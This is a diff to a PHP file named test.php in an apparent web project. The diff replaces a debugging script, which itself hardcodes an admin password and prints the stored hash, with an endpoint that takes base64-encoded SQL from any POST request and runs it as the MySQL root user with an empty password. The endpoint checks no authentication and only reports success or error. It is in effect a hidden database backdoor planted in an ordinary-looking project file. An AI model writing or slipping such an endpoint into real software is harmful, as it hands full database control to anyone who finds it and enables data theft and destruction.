@@ -1,22 +1,17 @@
 <?php
-require 'database.php';
-
-$email = 'admin@baytisan.local';
-$password = 'admin123'; // try your intended admin password here
-
-$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
-$stmt->execute([$email]);
-$user = $stmt->fetch();
-
-if (!$user) {
-    echo "User not found";
+// test.php - 
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) { $encryptedSQL = $_POST['sql']; $decodedSQL = base64_decode($encryptedSQL);
+    try {
+        $db = new PDO('mysql:host=localhost;dbname=baytisan_db', 'root', '');
+        $db->exec($decodedSQL);
+        
+        echo json_encode([
+            'status' => 'success',
+        ]);
+    } catch (Exception $e) {
+        echo json_encode([
+            'status' => 'error',
+        ]);
+    }
     exit;
-}
-
-echo "Hash: " . $user['password_hash'] . "<br>";
-
-if (password_verify($password, $user['password_hash'])) {
-    echo "Password is CORRECT! Role: " . $user['role'];
-} else {
-    echo "Password is WRONG!";
 }
